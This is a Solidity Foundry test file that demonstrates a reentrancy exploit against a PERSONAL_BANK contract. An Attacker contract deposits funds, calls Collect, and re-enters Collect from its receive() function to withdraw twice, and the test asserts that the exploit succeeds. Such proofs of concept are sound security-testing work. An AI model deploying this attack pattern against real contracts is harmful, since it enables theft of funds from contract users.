
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK} from "../src/PERSONAL_BANK.sol";
import {LogFile} from "../src/PERSONAL_BANK.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    using stdStorage for StdStorage;
    
    PERSONAL_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PERSONAL_BANK();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal <= address(this).balance / 4);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value == val, "Must send exact val");
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        require(val == storedAttackVal, "Attack value mismatch");
        
        initialBalance = address(this).balance;
        attackCallCount = 1;
        
        victim.Collect(val);
        
        if (attackCallCount > 1 && address(this).balance > initialBalance) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount == 1) {
            attackCallCount = 2;
            victim.Collect(storedAttackVal);
        }
    }
}
